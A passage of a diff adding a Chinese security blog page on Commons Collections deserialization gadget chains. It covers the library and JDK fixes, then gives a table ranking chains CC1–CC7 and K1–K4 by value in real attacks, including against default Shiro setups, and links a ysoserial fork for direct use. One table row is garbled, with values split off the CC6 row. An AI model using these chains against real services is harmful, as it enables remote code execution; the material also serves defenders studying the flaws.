+              TiedMapEntry.getValue()
+              LazyMap.get()
+                  ChainedTransformer.transform()
+</code></pre>
+<p><a name="eQzRb"></a></p>
+<h3 id="笔记-10">笔记</h3>
+<p>K3 这个链其实就是我上面写的 6，ysoserial 中的写法有些啰嗦，所以单独抽出来重新命名了一下。K4 就是 K3 的 4.0 适配版，不再赘述。<br>
+<a name="XbVkU"></a></p>
+<h2 id="修复方式">修复方式</h2>
+<p><a name="PSHVd"></a></p>
+<h3 id="321">3.2.1</h3>
+<p>在 3.2.2 中对几个高危反序列化点都加了检查</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {
+    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
+    is.defaultReadObject();
+}
+
+// FunctorUtils.checkUnsafeSerialization
+static void checkUnsafeSerialization(Class clazz) {
+    String unsafeSerializableProperty;
+
+    try {
+        unsafeSerializableProperty = 
+            (String) AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);
+                }
+            });
+    } catch (SecurityException ex) {
+        unsafeSerializableProperty = null;
+    }
+
+    if (!&quot;true&quot;.equalsIgnoreCase(unsafeSerializableProperty)) {
+        throw new UnsupportedOperationException(
+                &quot;Serialization support for &quot; + clazz.getName() + &quot; is disabled for security reasons. &quot; +
+                &quot;To enable it set system property '&quot; + UNSAFE_SERIALIZABLE_PROPERTY + &quot;' to 'true', &quot; +
+                &quot;but you must ensure that your application does not de-serialize objects from untrusted sources.&quot;);
+    }
+}
+</code></pre>
+<p>没有使用黑名单策略，如果配置里没有启用，反序列化功能就会被完全禁用掉。<br>
+<a name="e9pYD"></a></p>
+<h3 id="40">4.0</h3>
+<p>直接把一些敏感类的 <code>Serializable</code> 接口去掉了..</p>
+<blockquote>
+<ul>
+<li><b>WARNING:</b> from v4.1 onwards this class will <b>not</b> be serializable anymore* in order to prevent potential remote code execution exploits. Please refer to* <a href="https://issues.apache.org/jira/browse/COLLECTIONS-580">COLLECTIONS-580</a><br />* for more details.* </p></li>
+</ul>
+</blockquote>
+<p><a name="dccJn"></a></p>
+<h3 id="annotationinvocationhandler">AnnotationInvocationHandler</h3>
+<p>除了对 CommonsCollections 本身的修复，JDK 对 <code>AnnotationInvocationHandler</code> 这个非常好用的类也做了些防护，在 8u71 中, 对 readObject 做了一些修改</p>
+<pre><code class="language-java">// sun.reflect.annotation.AnnotationInvocationHandler#readObject
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+    GetField var2 = var1.readFields();
+    Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);
+    Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);
+    AnnotationType var5 = null;
+
+    try {
+        var5 = AnnotationType.getInstance(var3);
+    } catch (IllegalArgumentException var13) {
+        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+    }
+
+    Map var6 = var5.memberTypes();
+    LinkedHashMap var7 = new LinkedHashMap();
+
+    String var10;
+    Object var11;
+    for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
+        Entry var9 = (Entry)var8.next();
+        var10 = (String)var9.getKey();
+        var11 = null;
+        Class var12 = (Class)var6.get(var10);
+        if (var12 != null) {
+            var11 = var9.getValue();
+            if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) {
+                var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));
+            }
+        }
+    }
+
+    AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
+    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
+}
+</code></pre>
+<p>注意到最终反序列化出的 memberValues 已经不是我们原始的 lazyMap 了，而是一个新的 LinkedHashMap，这样所有 <code>AnnotationInvocationHandler</code> 搭配 lazymap 的利用链全都失效了。这也是我不太喜欢这些利用链的原因，它们不仅有库的依赖，还有环境的依赖。那么哪些是高价值利用链，哪些是没有环境依赖就能打的，我们来总结一下。<br>
+<a name="Yh9vI"></a></p>
+<h2 id="总结">总结</h2>
+<blockquote>
+<p>注1：CC 意为 CommonsCollections<br>
+注2:  ysoserial 中部分依赖条件不正确，已实验并更正<br>
+注3：可改造指的是把 3 中的 lazymap.<em>decorate 换成 4 中的 lazymap.lazymap 就可以用</em></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">利用链</th>
+<th style="text-align:left">依赖</th>
+<th>推荐程度</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">CC1</td>
+<td style="text-align:left">AnnotationInvocationHandler<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
+<td style="text-align:left">CC &lt;= 3.2.1<br />Java &lt; 8u71</td>
+<td>低</td>
+<td>可改造以支持 4.0</td>
+</tr>
+<tr>
+<td style="text-align:left">CC2</td>
+<td style="text-align:left">PriorityQueue<br />TransformingComparator<br />InvokerTransformer<br />TemplatesImpl</td>
+<td style="text-align:left">CC4.0</td>
+<td>中</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">CC3</td>
+<td style="text-align:left">AnnotationInvocationHandler<br />LazyMap.decorate<br />ChainedTransformer<br />InstantiateTransformer<br />TrAXFilter<br />TemplatesImpl</td>
+<td style="text-align:left">CC &lt;= 3.2.1<br />Java &lt; 8u71</td>
+<td>低</td>
+<td>可改造以支持 4.0</td>
+</tr>
+<tr>
+<td style="text-align:left">CC4</td>
+<td style="text-align:left">PriorityQueue<br />TransformingComparator<br />ChainedTransformer<br />InstantiateTransformer<br />TrAXFilter<br />TemplatesImpl</td>
+<td style="text-align:left">CC4.0</td>
+<td>中</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">CC5</td>
+<td style="text-align:left">BadAttributeValueExpException<br />TiedMapEntry.toString<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
+<td style="text-align:left">CC &lt;= 3.2.1<br />Java &gt;= 8u76<br />SecurityManger 未开启</td>
+<td>低</td>
+<td>可改造以支持 4.0</td>
+</tr>
+<tr>
+<td style="text-align:left">CC6</td>
+<td style="text-align:left">HashMap<br />TiedMapEntry.hashCode<br />TiedMapEntry.getValue<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
+<td style="text-align:left">CC &lt;= 3.2.1</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">高</td>
+<td style="text-align:left">可改造以支持 4.0</td>
+<td style="text-align:left"></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">CC7</td>
+<td style="text-align:left">Hashtable/HashMap<br />AbstractMap.equals<br />LazyMap.decorate<br />ChainedTransformer<br />InvokerTransformer</td>
+<td style="text-align:left">CC &lt;= 3.2.1</td>
+<td>高</td>
+<td>可改造以支持 4.0</td>
+</tr>
+<tr>
+<td style="text-align:left">K1/K2</td>
+<td style="text-align:left">HashMap.readObject<br /> TiedMapEntry.hashCode<br /> TiedMapEntry.getValue<br /> LazyMap.decorate<br /> InvokerTransformer<br />TemplatesImpl</td>
+<td style="text-align:left">K1: CC &lt;= 3.2.1<br />K2: CC == 4.0</td>
+<td>最高</td>
+<td>特别的：可以打 shiro 1.2.24 的默认环境</td>
+</tr>
+<tr>
+<td style="text-align:left">K3/K4</td>
+<td style="text-align:left">与 6 一致</td>
+<td style="text-align:left">K3: CC &lt;= 3.2.1<br />K4: CC == 4.0</td>
+<td>最高</td>
+<td>无任何依赖，是 6 的简化版</td>
+</tr>
+</tbody>
+</table>
+<p>CommonsCollections 有两个大版本，K3/K4 是这两个版本最好用的两条链，因为它们对环境毫无依赖，仅仅依赖于库本身。其次的 K1/K2 是两个使用字节码加载的利用链，TemplatesImpl 在部分环境下反序列化会被 SecurityManager 禁用，但这两个链可以打 shiro 1.2.24 的默认环境，所以也是很有实战价值的。综合来看，K1~K4 这四条链可以完整代替且超越之前的 1~7，他们加起来代表了 CommonsCollections 各种可能的情况，我将这一部分成果放在了 <a href="https://github.com/zema1/ysoserial">https://github.com/zema1/ysoserial</a> ，大家可以直接下载使用。<br>
+<a name="DkhTL"></a></p>
+<h2 id="后话">后话</h2>
+<p>其实江湖上还有其他的一些 gadget，但其他的利用链原理和已有的这些也都大差不差，说到底基于 CommonsCollections 的利用链基本都是这个模子出来的</p>
+<ol>
+<li>起点
+<ol>
+<li>AnnotationInvocationHandler</li>
+<li>XXComparator</li>
+<li>HashMap/HashSet/HashTable</li>
+</ol>
+</li>
+<li>终点
+<ol>
+<li>ChainedTransformer</li>
+<li>TemplatesImpl</li>
+</ol>
+</li>
+</ol>
+<p>熟悉这个规律，我们完全可以自己组合一下就会多出新的利用链。我在文中也有反复提到 shiro 的反序列化，shiro 是今年比较热门的一个漏洞，其反序列化和普通的反序列化稍有区别，我在此留个坑，以后再聊下我是如何科学且可靠的检测 shiro remeberme 反序列化的这个漏洞。</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://koalr.me/tag/java/" class="tag">
+                    Java
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://koalr.me/post/a-tour-of-xray/">
+                  <h3 class="post-title">
+                    推开 xray 之门
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.min.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
